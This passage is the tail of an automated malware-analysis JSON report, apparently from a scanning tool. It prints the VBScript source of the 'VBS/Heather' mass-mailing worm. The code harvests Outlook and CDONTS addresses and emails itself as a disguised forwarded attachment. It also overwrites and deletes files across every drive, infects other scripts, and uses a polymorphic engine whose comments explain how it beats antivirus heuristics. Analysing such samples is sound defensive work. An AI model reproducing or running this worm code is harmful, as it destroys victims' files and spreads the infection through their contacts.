            "Set MSOutlook = CreateObject(\"Outlook.Application\")",
            "Set OutlMapi = MSOutlook.GetNameSpace(\"MAPI\")",
            "For FldrCnt = 1 To OutlMapi.Folders.Count",
            "\tIf FldrCnt = 2 Then GoTo SkipFldr",
            "\tFor Each OutlItem Is OutlMapi.Folders(FldrCnt).Items",
            "\t\tFor Each VirRecip In OutlItem.Recipients",
            "\t\t\tIf InStr(1, AddrString, VirRecip.Address) = 0 Then AddrString = AddrString&VirRecip.Address&\"; \"",
            "\t\tNext",
            "\tNext",
            "SkipFldr:",
            "Next",
            "For Each OutlBook In OutlMapi.AddressLists",
            "\tFor Each OutlCntct In OutlBook.AddressEntries",
            "\t\tIf InStr(1, AddrString, OutlCntct.Address) = 0 Then AddrString = AddrString&OutlCntct.Address&\"; \"",
            "\tNext",
            "Next",
            "Rem Get even more e-mail addresses by flipping through the user's MS Outlook folders, and address",
            "Rem book.",
            "Set CdoMapi = CreateObject(\"CDONTS.Session\")",
            "CdoMapi.LogonSMTP",
            "For Each InboxCdo In CdoMapi.Inbox.Messages",
            "\tFor Each CdoRecip In InboxCdo.Recipients",
            "\t\tIf InStr(1, CdoRecip.Address, AddrString) = 0 Then AddrString = AddrString&CdoRecip.Address&\" ;\"",
            "\tNext",
            "Next",
            "Rem Get some addresses from the Inbox of the CDONTS e-mail service, which ships with MS IIS.",
            "If Not MSOutlook Is Nothing Then",
            "\tbIsOutlook = True",
            "ElseIf Not CdoMapi Is Nothing Then",
            "\tbIsOutlook = False",
            "Else",
            "\tGoTo SkipMail",
            "End If",
            "Rem Decide course of action for e-mail propogation.",
            "RcntFldr = WshShell.RegRead(Ssf&\"Recent\")",
            "For Each RcntFile In FSO.GetFolder(RcntFldr).Files",
            "\tRcntPath = Mid(RcntFile.Name, 1, Len(RcntFile.Name) - InStrRev(RcntFile.Name, \".\") - 1)",
            "\tRcntExt = UCase(Right(RcntPath, InStrRev(RcntPath, \".\") - 1))",
            "\tIf RcntExt = \"DOC\" Or RcntExt = \"DOT\" Or RcntExt = \"MP3\" Or RcntExt = \"WAV\" Or RcntExt = \"XLS\" Or RcntExt = \"PPT\" Or RcntExt = \"RTF\" Or RcntExt = \"TXT\" Or RcntExt = \"HTM\" Or RcntExt = \"HTML\" Or RcntExt = \"XLS\" Then",
            "\t\tRcntName = RcntPath",
            "\t\tRcntSubj = RcntPath",
            "\t\tRcntText = RcntPath&\" - Cool file, got this one from a friend.  You'll love it.\"",
            "\t\tExit For",
            "\tEnd If",
            "Next",
            "If RcntName = \"\" Then RcntName = \"HEATHER.JPG\"",
            "If RcntSubj = \"\" Then RcntSubj = \"Awesome Pic!\"",
            "If RcntText = \"\" Then RcntName = \">Now here is one beautiful lady...\"",
            "RcntName = RcntName&\".vbs\"",
            "Randomize",
            "FwStyle = Int(Rnd * 3) + 1",
            "If FwStyle = 1 Then",
            "\tRcntSubj = \"Fw: \"&RcntSubj",
            "ElseIf FwStyle = 2 Then",
            "\tRcntSubj = \"Fwd: \"&RcntSubj",
            "End If",
            "Call PolyCode",
            "RealRcnt = FSO.GetSpecialFolder(0)&\"\\\"&RcntName",
            "Set VirusAttach = FSO.CreateTextFile(RealRcnt, True)",
            "VirusAttach.Write NCryptBuff&vbCrLf&CryptBuff",
            "VirusAttach.Close",
            "Rem On the fly generation of viral message (pieces based on VBS/Stages and VBS/NewLove)",
            "Rem Uses a file from Recent as a base (as NewLove did) and chooses \"Fw: \" crap at random (As did",
            "Rem Stages).",
            "If bIsOutlook Then",
            "\tSet MsgItem = MSOutlook.CreateItem(0)",
            "Else",
            "\tSet MsgItem = CdoMapi.Outbox.Messages.Add",
            "End If",
            "MsgItem.BCC = AddyString",
            "MsgItem.Subject = RcntSubj",
            "MsgItem.Attachments.Add(RealRcnt)",
            "If bIsOutlook Then MsgItem.DeleteAfterSubmit = True",
            "MsgItem.Send",
            "WshShell.RegWrite \"HKLM\\SOFTWARE\\Miss Arnote\\\", \"Captivates...\"",
            "Rem Send e-mail using CDONTS/Outlook if present.",
            "SkipMail:",
            "For Each FsoDrive In FSO.Drives",
            "\tnum = num + InfectFiles(FsoDrive.Path&\"\\\", num)",
            "Next",
            "Rem Search the system for appropriate files, and infect.",
            "WshShell.Popup \"Dedicated to Heather Arnote, who has set a wonderful example for us all.\"&vbCrLf&\"Thanks, to people like Heather for upholding the spirit of society in such a corrupt place.\"&vbCrLf&\"Evolution is necessary for survival.  If you do not evolve, you die.  If this society holds on to its 18th century beliefs, in this, the 21st century, a world nuked to the bone with cyber and physical threats, it too will die.\"&vbCrLf&\"Sadly to say, it is already withering...  Like an old rose... And it eventually, will die.\"&vbCrLf&\"And as you can see the inability of 18th century ideals to combat this threat, what is our future?\"&vbCrLf&\"When computers will be in household appliances, and appliances will be linked to the world.\"&vbCrLf&\"Will we have hack attacks on toaster ovens?\"&vbCrLf&\"Just some food for thought.\"&vbCrLf&vbCrLf&\"VBS/Heather is copyright (c), FileSystemObject, July 2001.\"&vbCrLf&\"I'm sorry, but \"&CStr(num)\" of your files have been infected or destroyed.  I hope you enjoy restoring them as much as I enjoyed writing this!\"&vbCrLf&vbCrLf&\"Once again, food for thought...  How can a world that is repeatedly brought to its knees by simple pieces of script survive when everything will be connected.  Do you want to live like this?\", 0, \"A Message from FileSystemObject\", ",
            "Function InfectFiles(fspec, num)",
            "On Error Resume Next",
            "For Each FsoFile In FSO.GetFolder(fspec).Files",
            "\tFileExt = UCase(FSO.GetExtensionName(FsoFile.Path))",
            "\tFilePath = FsoFile.Path",
            "\tIf Extn = \"AIF\" Or Extn = \"AIFF\" Or Extn = \"AIFC\" Or Extn = \"ARC\" Or Extn = \"ARJ\" Or Extn = \"ASF\" Or Extn = \"ASP\" Or Extn = \"AVI\" Or Extn = \"BKS\" Or Extn = \"BMP\" Or Extn = \"CAB\" Or Extn = \"CHM\" Or Extn = \"CSS\" Or Extn = \"DAT\" Or Extn = \"DIB\" Or Extn = \"DOT\" Or Extn = \"DOC\" Or Extn = \"WLL\" Or Extn = \"WIZ\" Or Extn = \"EML\" Or Extn = \"FDF\" Or Extn = \"GIF\" Or Extn = \"GZ\" Or Extn = \"HLP\" Or InStr(1, Extn, \"HT\") > 0 Or Extn = \"INF\" Or Extn = \"IVF\" Or Extn = \"JFIF\" Or Extn = \"JPG\" Or Extn = \"JPE\" Or Extn = \"JPEG\" Or Extn = \"JS\" Or Extn = \"JSE\" Or Extn = \"LHA\" Or Extn = \"LOG\" Or Extn = \"LZH\" Or Extn = \"M1V\" Or Extn = \"M3U\" Or Extn = \"MAPIMAIL\" Or Extn = \"MBF\" Or Extn = \"MID\" Or Extn = \"MIDI\" Or Extn = \"MIDS\" Or Extn = \"MIM\" Or Extn = \"MIZ\" Or Extn = \"MJF\" Or Extn = \"MNY\" Or Extn = \"MOD\" Or Extn = \"MOV\" Or Mid(Extn, 1, 2) = \"MP\" Or Extn = \"MSG\" Or Extn = \"MSI\" Or Extn = \"MSP\" Or Extn = \"MSS\" Or Extn = \"MTM\" Or Extn = \"MUS\" Or Extn = \"MZIP\" Or Extn = \"NST\" Or Extn = \"NWS\" Or Extn = \"OCX\" Or Ext = \"OBD\" Or Extn = \"OFC\" \tOr Extn = \"OFX\" Or Extn = \"PDF\" Or Extn = \"PNG\" Or Extn = \"POT\" Or Extn = \"PPS\" Or Extn = \"PPT\" Or Mid(Extn, 1, 2) = \"QD\" Or Extn = \"QIF\" Or Extn = \"QWB\" Or Extn = \"RAR\" Or Extn = \"REG\" Or Extn = \"RMI\" Or Extn = \"RTF\" Or Extn = \"S3M\" Or Extn = \"SCT\" Or Extn = \"SHB\" Or Extn = \"SHS\" Or Extn = \"SND\" Or Extn = \"TAR\" Or Extn = \"TAZ\" Or Extn = \"TGZ\" Or Extn = \"TIF\" Or Extn = \"TIFF\" Or Extn = \"TLB\" Or Extn = \"TXT\" Or Extn = \"TZ\" Or Extn = \"UU\" Or Extn = \"UUE\" Or Extn = \"WAB\" Or Extn = \"WAV\" Or Extn = \"WDB\" Or Extn = \"WKS\" Or Extn = \"WMP\" Or Extn = \"MPP\" Or Extn = \"MPT\" Or Extn = \"WRI\" Or Extn = \"WSC\" Or Extn = \"WSF\" Or Extn = \"WSH\" Or Extn = \"XML\" Or Extn = \"XSL\" Or Mid(Extn, 1, 2) = \"XL\" Then",
            "\t\tSet VbsReplace = FSO.CreateTextFile(FilePath&\".vbs\")",
            "\t\tCall PolyCode",
            "\t\tVbsReplace.Write NCryptBuff&vbCrLf&CryptBuff",
            "\t\tVbsReplace.Close",
            "\t\tFSO.DeleteFile FsoFile.Path",
            "\t\tnum = num + 1",
            "Rem Damage routine.  This will add a \".vbs\" to a number of different extensions and infect that",
            "Rem new file with the worm, after which it will delete the original.  Many files will not be able",
            "Rem to be recovered.",
            "\tElseIf Extn = \"VBE\" Then",
            "\t\tSet ReadVictim = FSO.OpenTextFile(FilePath)",
            "\t\tszVbe = ReadVictim.ReadAll",
            "\t\tszFindVir = InStr(1, szVbe, \"Rem VBS/Heather@mm by FSo.\")",
            "\t\tReadVictim.Close",
            "\t\tIf szFindVir = 0 Then",
            "\t\t\tCall PolyCode",
            "\t\t\tSet VbeWrite = FSO.CreateTextFile(FilePath, True)",
            "\t\t\tVbeWrite.Write NCryptBuff&vbCrLf&CryptBuff&vbCrLf&szVbe",
            "\t\t\tVbeWrite.Close",
            "\t\tEnd If",
            "\t\tnum = num + 1",
            "Rem VBE infection.  Infect by prepending (any other way you get an error, kinda stupid!)",
            "\tElseIf Extn = \"VBS\" Or Extn = \"WSF\" Then",
            "\t\tSet ReadVbsVictim = FSO.OpenTextFile(FilePath)",
            "\t\tszVbs = ReadVbsVictim.ReadAll",
            "\t\tszFindVbsVir = InStr(1, szVbs, \"Rem VBS/Heather@mm by FSo.\")",
            "\t\tVbsSplit() = Split(szVbs, vbCrLf)",
            "\t\tNumOfLines = UBound(VbsSplit)",
            "\t\tReadVbsVictim.Close",
            "\t\tIf szFindVbsVir = 0 Then",
            "\t\t\tRandomize",
            "\t\t\tLineNum = Int(Rnd * NumOfLines) + 1",
            "\t\t\tIf Extn = \"WSF\" And LineNum < 4 Then LineNum = 4",
            "\t\t\tSet WriteVbs = FSO.CreateTextFile(FilePath, True)",
            "\t\t\tFor SplitCount = 0 To LineNum - 1",
            "\t\t\t\tWriteVbs.WriteLine VbsSplit(SplitCount)",
            "\t\t\tNext",
            "\t\t\tCall PolyCode",
            "\t\t\tWriteVbs.WriteLine NCryptBuff&vbCrLf&CryptBuff",
            "\t\t\tFor SplitCount = LineNum To UBound(VbsSplit)",
            "\t\t\t\tWriteVbs.WriteLine VbsSplit(SplitCount)",
            "\t\t\tNext",
            "\t\tEnd If",
            "\t\tnum = num + 1",
            "\tEnd If",
            "Next",
            "InfectFiles = num",
            "End Sub",
            "Rem Interesting hack on VBS/WSF infection.  I could have made it EPO, but the jump would have",
            "Rem defeated the purpose of mid-file insertion: disguise, and to beat heuristics.  The EPO jump",
            "Rem would go immediately to our virus code.  This would look suspicious because a decryptor in",
            "Rem the middle of a file, pointed to by a GoTo would just be weird.  Also, the user would surely",
            "Rem see an inserted goto immediately, unless they had like a page of comments (and even that may",
            "Rem not hide it!)",
            "Sub EncryptCode()",
            "On Error Resume Next",
            "Randomize",
            "Seed = Int(Rnd * 254) + 1",
            "CryptBuff = Replace(CryptBuff, Chr(39), \"\")",
            "For CryptoLen = 1 To Len(CryptBuff)",
            "\tChAsc = Asc(Chr(Mid(CryptBuff, CryptoLen, 1))) + Seed",
            "\tIf ChAsc > 255 Then",
            "\t\tChAsc = ChAsc - 255",
            "\tEnd If",
            "\tIf ChAsc = 10 Or ChAsc = 13 Then NewCrypt = NewCrypt&Chr(39)",
            "\tNewCrypt = NewCrypt&Chr(ChAsc)",
            "Next",
            "CryptBuff = Chr(39)&CryptBuff",
            "End Sub",
            "Rem Polymorphic encyptor.  Chooses a random seed and uses ASCII char table to encode all chars in",
            "Rem the virus body that need to be encoded (i.e, not the decryptor!)",
            "Sub PolyCode()",
            "On Error Resume Next",
            "PolyArr(96) = Array(\"FSO\", \"ScrBuf\", \"VirusBuff\", \"EndStr\", \"VirusLoc\", \"VirusLoc2\", \"CryptStr\", \"CryptLoc\", \"CryptLoc2\", \"NCryptBuff\", \"CryptBuff\", \"Seed\", \"CryptLen\", \"ExecuteBuff\", \"SkipCrypt\", \"PolyArr\", \"PolyLen\", \"NameLen\", \"NewVar\", \"CharCount\", \"CharType\", \"CharCase\", \"PolyCode\", \"EncryptCode\", \"CryptoLen\", \"ChAsc\", \"NewCrypt\", \"WshShell\", \"Ssf\", \"intSpf\", \"FileLen\", \"FileChars\", \"FileVar\", \"RegBase\", \"WshNetwork\", \"WNEnum\", \"NetNum\", \"InfectFiles\", \"SkipMail\", \"CacheFldr\", \"AddyString\", \"AppData\", \"MSWab\", \"WabFile\", \"WabOpen\", \"WabBuff\", \"strFindAt\", \"strOldAddr\", \"AddyBuff\", \"strChar\", \"szChar\", \"MSOutlook\", \"OutlMapi\", \"FldrCnt\", \"SkipFldr\", \"OutlItem\", \"VirRecip\", \"OutlBook\", \"OutlCntct\", \"CdoMapi\", \"InboxCdo\", \"CdoRecip\", \"bIsOutlook\", \"RcntFldr\", \"RcntFile\", \"RcntPath\", \"RnctExt\", \"RcntName\", \"RcntSubj\", \"RcntText\", \"FwStyle\", \"RealRcnt\", \"VirusAttach\", \"MsgItem\", \"FsoDrive\", \"InfectFiles\", \"fspec\", \"num\", \"FsoFile\", \"FileExt\", \"FilePath\", \"Extn\", \"VbsReplace\", \"ReadVictim\", \"szVbe\", \"szFindVir\", \"ReadVictim\", \"VbeWrite\", \"szVbs\", \"szFindVbsVir\", \"ReadVbsVictim\", \"VbsSplit\", \"NumOfLines\", \"LineNum\", \"WriteVbs\", \"SplitCount\")",
            "Randomize",
            "For PolyLen = 0 To UBound(PolyArr)",
            "\tNewVar = \"\"",
            "\tNameLen = Int(Rnd * 10) + 5",
            "\tFor CharCount = 1 To NameLen",
            "\t\tCharType = Int(Rnd * 2) + 1",
            "\t\tIf CharType = 1 Then",
            "\t\t\tNewVar = NewVar&CStr(Int(Rnd * 10))",
            "\t\tElse",
            "\t\t\tCharCase = Int(Rnd * 2) + 1",
            "\t\t\tChar = Int(Rnd * 26) + 64",
            "\t\t\tIf CharCase = 1 Then",
            "\t\t\t\tNewVar = NewVar&UCase(Chr(Char))",
            "\t\t\tElse",
            "\t\t\t\tNewVar = NewVar&LCase(Chr(Char))",
            "\t\t\tEnd If",
            "\t\tEnd If",
            "\tNext",
            "\tNCryptBuff = Replace(NCryptBuff, PolyArr(PolyLen), NewVar)",
            "\tExecuteBuff = Replace(ExecuteBuff, PolyArr(PolyLen), NewVar)",
            "Next",
            "End Sub",
            "Rem Poly engine.  This drastically changes the size of the virus with every infection.  Another",
            "Rem awesome advantage of this is that the virus will be reported as 'No Remover Available' or a",
            "Rem similar thing by AVs, especially being it inserts itself in a random location in infected ",
            "Rem VBS, and WSF files.  (inserts at beginning of VBE, else you get an error on run.)"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.435971",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
